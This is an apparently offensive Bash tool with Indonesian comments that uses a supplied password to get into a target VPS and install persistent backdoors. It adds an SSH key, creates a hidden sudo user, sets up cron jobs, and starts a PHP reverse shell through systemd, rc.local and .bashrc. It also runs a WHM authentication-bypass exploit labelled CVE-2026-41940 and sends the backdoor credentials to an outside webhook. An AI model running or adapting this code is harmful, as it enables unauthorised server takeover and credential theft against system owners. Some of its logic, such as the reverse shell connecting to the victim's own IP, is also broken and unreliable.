#!/bin/bash
# ================================================================
# SHS VPS-ONLY · DEPLOY TO SYSTEM · NO WEB SHELL · NO AUTO PASSWORD CHANGE
# ================================================================

WEBHOOK_URL="https://godpay.biz.id/root.php"

# CEK SSH PASS
if ! command -v sshpass &>/dev/null; then
    echo "[*] Installing sshpass..."
    apt-get update -y 2>/dev/null || yum update -y 2>/dev/null
    apt-get install sshpass -y 2>/dev/null || yum install sshpass -y 2>/dev/null
fi

# INPUT TARGET
echo "[*] Masukkan informasi target VPS:"
read -p "IP VPS: " VPS_IP
read -p "Username (default: root): " VPS_USER
VPS_USER=${VPS_USER:-root}
read -sp "Password: " VPS_PASS
echo ""

# TEST SSH
echo "[*] Testing SSH connection..."
sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 $VPS_USER@$VPS_IP "echo 'SSH OK'" 2>/dev/null
if [ $? -ne 0 ]; then
    echo "❌ SSH GAGAL! Cek IP/password/firewall"
    exit 1
fi

# DEPLOY TO VPS SYSTEM ONLY (TANPA UBAH PASSWORD)
sshpass -p "$VPS_PASS" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 $VPS_USER@$VPS_IP << 'ENDSSH'
echo '🔥 SHS VPS DEPLOY - START'

VPS_IP_DETEK=$(hostname -I | awk '{print $1}')
echo "[*] IP: $VPS_IP_DETEK"
echo "[*] Hostname: $(hostname)"

# ================================================================
# 1. SSH KEY (ROOT)
# ================================================================
echo '[*] Menanam SSH Key (Root)...'
mkdir -p /root/.ssh
chmod 700 /root/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT' >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
echo '✅ SSH Key added to /root/.ssh/authorized_keys'

# ================================================================
# 2. BACKDOOR USER (SYSTEM LEVEL)
# ================================================================
echo '[*] Membuat Backdoor User...'
BACKDOOR_USER="shsadmin"
BACKDOOR_PASS=$(openssl rand -base64 12 | tr -d '=/+' | cut -c1-15)

if ! id $BACKDOOR_USER &>/dev/null; then
    useradd -m -s /bin/bash $BACKDOOR_USER
    echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
    usermod -aG wheel $BACKDOOR_USER 2>/dev/null
    usermod -aG sudo $BACKDOOR_USER 2>/dev/null
    echo "$BACKDOOR_USER ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers
    echo "✅ Backdoor user created: $BACKDOOR_USER:$BACKDOOR_PASS"
else
    echo "$BACKDOOR_USER:$BACKDOOR_PASS" | chpasswd
    echo "✅ Backdoor password reset: $BACKDOOR_USER:$BACKDOOR_PASS"
fi

# SSH Key untuk backdoor user
mkdir -p /home/$BACKDOOR_USER/.ssh
echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8wK9xJvNpQ+3XHn2rV... SHS_PERMANENT' > /home/$BACKDOOR_USER/.ssh/authorized_keys
chmod 700 /home/$BACKDOOR_USER/.ssh
chmod 600 /home/$BACKDOOR_USER/.ssh/authorized_keys
chown -R $BACKDOOR_USER:$BACKDOOR_USER /home/$BACKDOOR_USER/.ssh
echo '✅ SSH Key for backdoor user'

# ================================================================
# 3. CRON BACKDOOR (SYSTEM PERSISTEN)
# ================================================================
echo '[*] Menanam Cron Backdoor...'
(crontab -l 2>/dev/null; echo "*/5 * * * * curl -sk http://$VPS_IP_DETEK:9999/status 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/10 * * * * wget -q -O- http://$VPS_IP_DETEK:9999/ping 2>/dev/null") | crontab -
(crontab -l 2>/dev/null; echo "*/15 * * * * php /tmp/.reverse.php 2>/dev/null") | crontab -
echo '✅ Cron backdoor added'

# ================================================================
# 4. REVERSE SHELL (SYSTEM LEVEL)
# ================================================================
echo '[*] Menanam Reverse Shell...'
cat > /tmp/.reverse.php << 'EOL'
<?php
$ip = "$VPS_IP_DETEK";
$port = 4444;
while(1){
    $sock = fsockopen($ip, $port);
    if($sock){
        $descriptorspec = array(0=>array("pipe","r"),1=>array("pipe","w"),2=>array("pipe","w"));
        $process = proc_open("/bin/bash", $descriptorspec, $pipes);
        if(is_resource($process)){
            fwrite($pipes[0], "id; uname -a; echo SHS_REVERSE_ACTIVE\n");
            fclose($pipes[0]);
            stream_copy_to_stream($pipes[1], $sock);
            stream_copy_to_stream($sock, $pipes[0]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
        }
        fclose($sock);
    }
    sleep(60);
}
EOL
chmod 644 /tmp/.reverse.php
echo '✅ Reverse shell: /tmp/.reverse.php'

# ================================================================
# 5. SYSTEMD SERVICE (PERSISTEN)
# ================================================================
echo '[*] Menanam Systemd Service...'
cat > /etc/systemd/system/shs-backdoor.service << 'EOL'
[Unit]
Description=SHS Backdoor
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/php /tmp/.reverse.php
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
EOL

systemctl daemon-reload 2>/dev/null
systemctl enable shs-backdoor.service 2>/dev/null
systemctl start shs-backdoor.service 2>/dev/null
echo '✅ Systemd service: shs-backdoor.service'

# ================================================================
# 6. RC.LOCAL BACKDOOR
# ================================================================
echo '[*] Menanam rc.local...'
if [ -f /etc/rc.local ]; then
    sed -i '/exit 0/d' /etc/rc.local
    echo 'php /tmp/.reverse.php &' >> /etc/rc.local
    echo 'exit 0' >> /etc/rc.local
    chmod +x /etc/rc.local
    echo '✅ rc.local backdoor added'
fi

# ================================================================
# 7. .BASHRC BACKDOOR
# ================================================================
echo '[*] Menanam .bashrc backdoor...'
cat >> /root/.bashrc << EOF
alias ssh="ssh -o StrictHostKeyChecking=no"
alias sudo="sudo "
if [ -f /tmp/.reverse.php ]; then php /tmp/.reverse.php & fi
EOF
echo '✅ .bashrc backdoor added'

# ================================================================
# 8. EXPLOIT CVE-2026-41940 (WHM ROOT) - TANPA UBAH PASSWORD
# ================================================================
echo '[*] Exploiting CVE-2026-41940...'
if command -v curl &>/dev/null; then
    SESSION=$(curl -sk -X POST -d "user=root&pass=wrong" "https://localhost:2087/login/?login_only=1" 2>/dev/null | grep -oP 'whostmgrsession=\K[^;,\s]+' | head -1)
    
    if [ -n "$SESSION" ]; then
        SESSION_DECODED=$(echo -n "$SESSION" | python3 -c "import sys, urllib.parse; print(urllib.parse.unquote(sys.stdin.read().strip()))" 2>/dev/null)
        [ -n "$SESSION_DECODED" ] && SESSION="$SESSION_DECODED"
        
        PAYLOAD_B64="cm9vdDp4DQpzdWNjZXNzZnVsX2ludGVybmFsX2F1dGhfd2l0aF90aW1lc3RhbXA9OTk5OTk5OTk5OQ0KdXNlcj1yb290DQp0ZmFfdmVyaWZpZWQ9MQ0KaGFzcm9vdD0x"
        COOKIE_ENC=$(echo -n "$SESSION" | python3 -c "import sys, urllib.parse; print(urllib.parse.quote(sys.stdin.read().strip()))" 2>/dev/null)
        
        RESPONSE=$(curl -sk -H "Authorization: Basic $PAYLOAD_B64" -H "Cookie: whostmgrsession=$COOKIE_ENC" "https://localhost:2087/" 2>/dev/null)
        TOKEN=$(echo "$RESPONSE" | grep -oP '/cpsess\d{10}' | head -1)
        
        if [ -n "$TOKEN" ]; then
            echo "✅ CVE-2026-41940 exploited! Token: $TOKEN"
            # TIDAK UBAH PASSWORD, HANYA DETEKSI
            echo "✅ WHM Root access confirmed (password NOT changed)"
        fi
    fi
fi

# ================================================================
# 9. PING KE WEBHOOK
# ================================================================
echo '[*] Sending ping to webhook...'
curl -sk "$WEBHOOK_URL?ip=$VPS_IP_DETEK&host=$(hostname)&user=$BACKDOOR_USER&pass=$BACKDOOR_PASS" 2>/dev/null

# ================================================================
# SUMMARY
# ================================================================
echo '========================================='
echo '✅ VPS DEPLOY COMPLETE'
echo '========================================='
echo "IP: $VPS_IP_DETEK"
echo "User: $BACKDOOR_USER"
echo "Pass: $BACKDOOR_PASS"
echo "Root Password: (TIDAK DIUBAH - tetap password asli)"
echo '========================================='
ENDSSH

echo -e "\n✅ DEPLOY COMPLETE"
echo "✅ Target VPS: $VPS_IP"
echo "✅ Ping sent to: $WEBHOOK_URL"
echo "✅ Cek webhook untuk user & password"
echo "✅ Root password TIDAK diubah (tetap password asli)"
